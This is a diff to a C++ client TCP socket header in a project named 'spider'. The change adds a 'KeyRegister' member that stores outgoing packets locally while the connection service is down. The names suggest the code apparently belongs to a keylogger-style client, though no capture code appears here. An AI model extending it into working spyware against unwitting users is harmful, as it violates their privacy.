@@ -11,16 +11,17 @@
 #ifndef CLIENTTCPSOCKET_HPP_
 # define CLIENTTCPSOCKET_HPP_
 
-#include "spider/packetUnserializer.hpp"
-#include "spider/packetSerializer.hpp"
-#include "Network/sockets/Client.hpp"
-
 #ifdef _WIN32
 #include <Windows.h>
 #endif
 #include <list>
 #include <mutex>
 #include <queue>
+
+#include "spider/packetUnserializer.hpp"
+#include "spider/packetSerializer.hpp"
+#include "Network/sockets/Client.hpp"
+#include "keyRegister/keyRegister.hpp"
 
 namespace spider
 {
@@ -35,14 +36,21 @@ namespace spider
       //methode to use the socket
       void connect(); // connect to the server
       void close(); // disconnet the client
-      template<class packet>
+      
+	  template<class packet>
       void write(spider::PacketSerializer<packet> data)
       {
-	_Mqueue.lock();
-	_messages.push_back(data.getPackedData(1));
-	_messagesSize.push_back(data.getPacketSize());
-	_Mqueue.unlock();
-      }
+		_Mqueue.lock();
+		_messages.push_back(data.getPackedData(1));
+		_messagesSize.push_back(data.getPacketSize());
+		if (!_runningService)
+		{
+			_keyRegister.write(_messages.front(), _messagesSize.front());
+			delete[] _messages.front();
+			_messages.pop_front();
+		}
+		_Mqueue.unlock();
+	  }
 
       // methode to manage the service
       bool startedService() const;
@@ -61,6 +69,7 @@ namespace spider
       void readHeader();
       void readData();
       void doWrite();
+	  void pushFileCMD(char *bufferFile, int bufferSize);
 
     private:
       Socket::Client				_client;
@@ -78,6 +87,8 @@ namespace spider
       std::mutex				_Mqueue;
 	  std::mutex _mtxQ;
 	  std::queue<char *> _rdQ;
+
+	  spider::KeyRegister		_keyRegister;
 
 #ifdef _WIN32
 	  DWORD mainThreadId;
